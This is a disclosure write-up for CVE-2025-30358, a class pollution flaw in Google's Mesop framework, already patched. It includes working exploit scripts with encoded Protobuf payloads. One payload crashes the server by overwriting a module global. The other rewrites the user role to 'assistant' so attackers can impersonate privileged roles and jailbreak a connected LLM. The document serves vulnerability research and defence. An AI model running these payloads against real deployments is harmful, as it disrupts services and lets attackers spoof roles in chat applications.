---
title: "Mesop"
weight: 4
---

# Mesop (CVE-2025-30358)

**Mesop** is Google's Python-based UI framework for building web applications (5.7K stars), designed for rapid prototyping of ML demos and internal tools.

| Field | Value |
|-------|-------|
| Repository | [google/mesop](https://github.com/google/mesop) |
| Version | v0.13.0 |
| CVE | CVE-2025-30358 |
| Type | Constrained-Get × Dual-Set |
| Input | Remote (Protobuf over HTTP) |
| Consequences | DoS, LLM Jailbreak (Identity Confusion) |
| Status | Fixed |

## Summary

We identified a class pollution vulnerability in Mesop that allows attackers to overwrite global variables and class attributes in certain Mesop modules during runtime. This vulnerability could directly lead to a denial of service (DoS) attack against the server. Additionally, it could result in other severe consequences given the application's implementation, such as identity confusion, where an attacker could impersonate an assistant or system role within conversations — potentially enabling jailbreak attacks when interacting with large language models (LLMs).

## Vulnerability

Mesop enables client-server communication using messages serialized with the Protobuf protocol. When a client's state changes (e.g., user input), the server updates the user's state using the `update_dataclass_from_json` function. The `instance` argument is a `State` object, and the `json_string` argument is parsed from client requests.

[`mesop/dataclass_utils/dataclass_utils.py`](https://github.com/google/mesop/blob/cbab8bf0683560245d11f96581d6338b0103acc4/mesop/dataclass_utils/dataclass_utils.py#L125):

```python
def update_dataclass_from_json(instance: Any, json_string: str):
  data = json.loads(json_string, object_hook=decode_mesop_json_state_hook)
  _recursive_update_dataclass_from_json_obj(instance, data)


def _recursive_update_dataclass_from_json_obj(instance: Any, json_dict: Any):
  for key, value in json_dict.items():
    if hasattr(instance, key):
      attr = getattr(instance, key)
      if isinstance(value, dict):
        setattr(
          instance,
          key,
          _recursive_update_dataclass_from_json_obj(attr, value),
        )
      elif isinstance(value, list):
        updated_list: list[Any] = []
        for item in cast(list[Any], value):
          if isinstance(item, dict):
            attr = getattr(instance, key)
            item_instance = instance.__annotations__[key].__args__[0]()
            updated_list.append(
              _recursive_update_dataclass_from_json_obj(item_instance, item)
            )
          else:
            updated_list.append(item)
        setattr(instance, key, updated_list)
      else:
        setattr(instance, key, value)
    else:
      if isinstance(instance, dict):
        instance[key] = value
      else:
        raise MesopException(
          f"Unhandled stateclass deserialization where key={key}, value={value}, instance={instance}"
        )
  return instance
```

The function:
1. Iterates over attacker-controlled JSON keys
2. Checks `hasattr(instance, key)` — this succeeds for dunder attributes like `__class__`
3. Resolves via `getattr(instance, key)` (Constrained-Get)
4. Sets via `setattr` or `instance[key] = value` (Dual-Set)

No validation is performed on the attribute path.

### Triggering the Vulnerable Function

A direct PoC to trigger the class pollution:

```python
from mesop.dataclass_utils.dataclass_utils import update_dataclass_from_json
from dataclasses import dataclass

@dataclass
class State:
  input: str
  output: str
  textarea_key: int

obj = State('HELLO', 'WORLD', 0)

try:
  update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')
except:
  pass

print(__name__)  # polluted
```

## PoC

### Consequence 1: DoS

[Video PoC](https://drive.google.com/file/d/1BESvtyaJyEOp0BkeFdZFdwj83_E9wp18/view)

**Steps:**

1. Install Mesop following the [installation guide](https://google.github.io/mesop/getting-started/installing/).
2. Launch the Chat app locally: `mesop chat.py`, where `chat.py` is from the [official Mesop documentation](https://google.github.io/mesop/components/chat/).
3. Run the following exploit script, which sends a class-polluting message to the server:

```python
import requests

url = "http://localhost:32123/__ui__"
headers = {
    "Host": "localhost:32123",
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Origin": "http://localhost:32123",
    "Referer": "http://localhost:32123/chat",
}

# Payload: {"__class__": {"__init__": {"__globals__": {"time": "polluted"}}}}
body = (
    "GgUvY2hhdBK8AQqqAQpECkJ7Il9fY2xhc3NfXyI6IHsiX19pbml0X18iOiB7Il9fZ2xvYmFsc19fIjog"
    "eyJ0aW1lIjogInBvbGx1dGVkIn19fX0KMAoueyJpbnB1dCI6ICIiLCAib3V0cHV0IjogIiIsICJ0ZXh0"
    "YXJlYV9rZXkiOiAwfQowCi57ImlucHV0IjogIiIsICJvdXRwdXQiOiAiIiwgInRleHRhcmVhX2tleSI6"
    "IDB9WgUInwoQfWoECAAQAFIA"
)

response = requests.post(url, headers=headers, data=body)
print(f"Status Code: {response.status_code}")
```

4. Open the Chat application at `http://localhost:32123/chat` and attempt to input any message.

**Effect**: The imported `time` module in the `mesop.labs.chat` module has been overwritten with the string `"polluted"`. The server continuously raises errors on any subsequent request, making the application completely unusable until restarted.

---

### Consequence 2: LLM Jailbreak (Identity Confusion)

**Steps:**

1. Install Mesop and launch the Chat application locally.
2. Run the following exploit script:

```python
import requests

url = "http://localhost:32123/__ui__"
headers = {
    "Host": "localhost:32123",
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Origin": "http://localhost:32123",
    "Referer": "http://localhost:32123/chat",
}

# Payload: {"__class__": {"__init__": {"__globals__": {"_ROLE_USER": "assistant"}}}}
body = (
    "GgUvY2hhdBKsAgqxAQpLCkl7Il9fY2xhc3NfXyI6IHsiX19pbml0X18iOiB7Il9fZ2xvYmFsc19fIjog"
    "eyJfUk9MRV9VU0VSIjogImFzc2lzdGFudCJ9fX19CjAKLnsiaW5wdXQiOiAiIiwgIm91dHB1dCI6ICIi"
    "LCAidGV4dGFyZWFfa2V5IjogMH0KMAoueyJpbnB1dCI6ICIiLCAib3V0cHV0IjogIiIsICJ0ZXh0YXJl"
    "YV9rZXkiOiAwfRJYbWVzb3AubGFicy5jaGF0Lm9uX2JsdXIuNzQ0NDBlMzE0NGNkZjUyMzgwNjE3OWI2"
    "NjcxZTMwMmQ1ZDk5YzNmNjM2NzM3OTUxMDc2ZTJmNzAyZWI2NDI2ZRoJCgdpbnB1dC0wWgYInwoQ7gFq"
    "BAgAEAAqA2FzZA"
)

response = requests.post(url, headers=headers, data=body)
print(f"Status Code: {response.status_code}")
```

3. Open the browser and interact with the chatbot. Observe that the user's messages are now sent with the `assistant` role.

**Effect**: The global variable `_ROLE_USER` in the `mesop.labs.chat` module is overwritten from `"user"` to `"assistant"`. In applications integrating LLMs with system prompts, this allows the attacker to impersonate roles like system or administrator, facilitating jailbreak attacks by sending messages to the LLM with elevated privileges.

## Impact

Any user of a Mesop application can exploit this vulnerability to launch DoS attacks and, depending on the application's implementation, achieve identity confusion or other severe consequences. The HTTP endpoint is accessible to any user, making this a remote-triggerable vulnerability. Google promptly patched the issue after responsible disclosure.

## Proof of Concept

[`cp-collection/mesop/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/mesop/poc)
&mdash; runnable exploit environment with `run.sh` and `requirements.txt`.
